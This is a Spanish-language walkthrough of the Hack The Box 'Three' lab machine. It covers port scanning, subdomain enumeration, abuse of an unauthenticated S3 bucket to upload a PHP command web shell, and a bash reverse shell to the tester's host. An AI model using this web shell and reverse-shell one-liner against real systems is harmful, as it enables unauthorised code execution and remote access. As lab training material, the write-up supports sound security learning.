---
title: Writeup three - Hack The Box - Resolución y Análisis
published: true
tags:
  - hackthebox
  - writeup
  - three
  - ciberseguridad
  - pentesting
description: Writeup y resolución de la máquina three en Hack The Box.
keywords:
  - writeup three
  - hack the box three
  - resolución máquina three
  - three hack the box
  - htb three
---
------
### 🔗 Accesos rápidos

- 📄 **Writeup online**: [Link](https://publish.obsidian.md/bunzopy/HTB/SuperFacil/Tier+1/Linux/Three)
- 📺 **Resolución en vivo (completa)**: [Parte1](https://www.youtube.com/watch?v=jVak5k46ODM)|[Parte2](https://www.youtube.com/watch?v=k6nprw1Ol_w)                                                                                                             
- 🧠 **Explicación resumida**: [Link](https://www.youtube.com/watch?v=sGjqDbMId3U)

-----

#veryeasy #linux #ping #nmap #nvim #sudo #/etc/hosts #aws #reverseshell #whatweb  #gobuster #cat

---
# Guided Mode

1)¿Cuántos puertos TCP hay abiertos?
	2

2)¿Cuál es el dominio de la dirección de correo electrónico facilitada en la sección «Contacto» del sitio web?
	thetoppers.htb

3)En ausencia de un servidor DNS, ¿qué archivo de Linux podemos utilizar para resolver nombres de host en direcciones IP con el fin de poder acceder a los sitios web que apuntan a esos nombres de host?
	/etc/hosts

4)¿Qué subdominio se descubre durante la enumeración posterior?
	s3.thetoppers.htb
	
5)¿Qué servicio se ejecuta en el subdominio descubierto?
	amazon s3

6)¿Qué utilidad de línea de comandos puede utilizarse para interactuar con el servicio que se ejecuta en el subdominio descubierto?
	awscli

7)¿Qué comando se utiliza para configurar la instalación de la CLI de AWS?
	aws configure

8)¿Cuál es el comando utilizado por la utilidad anterior para listar todos los buckets de S3?
	aws s3 ls
	
9)¿Este servidor está configurado para ejecutar archivos escritos en qué lenguaje de scripting web?
	php

-------
# [[Reconocimiento de OS(Sistema operativo) y puertos abiertos con NMAP]]

```shell
ping -c 1 10.129.227.248
nmap -p- --open -vvv --min-rate 5000 -sS -n -Pn 10.129.227.248 -oG allPorts
extractPorts allPorts
nmap -sCV -p22,80 10.129.227.248 -oN target
```

![[Three1.png]]

![[Three2.png]]
*TTL:* Maquina Linux
*Puertos:*
	`22` [[ssh]]
	`80` HTTP

------
# [[Whatweb-wappalyzer]]
![[Three3.png]]
Nos da el mail con dominio thetoppers.htb que lo vamos a agregar a etc/hosts para probar

------
# Agregar dominio a /etc/hosts

Vamos a ejecutar con [[nvim]] y [[sudo]] el comando `sudo nvim /etc/hosts` para modificar el archivo abriendolo como root
```
10.129.227.248 thetoppers.htb
```

![[Three4.png]]

--------

# Enumeracion de subdominios con [[Gobuster]]

```shell
gobuster vhost -u http://thetoppers.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain
```

![[Three5.png]]
Como resultado tenemos s3.thetoppers.htb

-----
# Agregar subdominio a /etc/hosts

Vamos a ejecutar con [[nvim]] y [[sudo]] el comando `sudo nvim /etc/hosts` para modificar el archivo abriendolo como root

```
10.129.182.45 s3.thetoppers.htb
```

![[Three6.png]]

Ahora entramos a la pagina `http://s3.thetoppers.htb/` y ya nos va a cargar
![[Three13.png]]

-------
# Carga de archivo malisioso con [[aws]]

Vamos a acceder a los contenedores de amazon s3, y ver sus contenidos para enumerar un poco, podemos ver que estos son los archivos de la pagina principal, asi que vamos a cargar posteriormente un archivo que nos permita ejecutar comandos

Con el primer comando al ver que nos responde thetoppers.htb sabemos que esta hosteando la pagina victima, asi que vamos a intentar cargar y/o modificar archivos
Con el segundo comando visualizamos el contenido del directorio

```shell
aws --endpoint-url http://s3.thetoppers.htb s3 ls --no-sign-request
aws --endpoint-url http://s3.thetoppers.htb s3 ls s3://thetoppers.htb --no-sign-request
```

![[Three7.png]]



#### Cargamos el archivo [[archivo php inyección comandos]]

Contenido del archivo exploit.php
```
<?php system($_GET["cmd"]); ?>
```

Ahora con este comando de [[aws]] vamos a cargar el archivo exploit.php
```
aws --endpoint-url=http://s3.thetoppers.htb s3 cp exploit.php s3://thetoppers.htb --no-sign-request
```

![[Three8.png]]

Desde la maquina victima, vamos a hacer una prueba para ver si funciona el archivo que cargamos

http://thetoppers.htb/exploit.php?cmd=id
![[Three9.png]]
Como podemos ver nos muestra nos responde, asi que el archivo cumple su funcion correctamente


-------
# [[Reverse shell]]

Desde la maquina victima vamos a ejecutar el siguiente link `http://thetoppers.htv/exploit.php?cmd=bash -c 'bash -i >%26 /dev/tcp/10.10.16.16/443 0>%261'`

![[Three11.png]]

Mientras que desde nuestra maquina vamos a estar en escucha con [[nc -nlvp 443]]

![[Three12.png]]
Una vez dentro de la maquina cateamos la flag

----------
# Creditos
Writeup oficial HackTheBox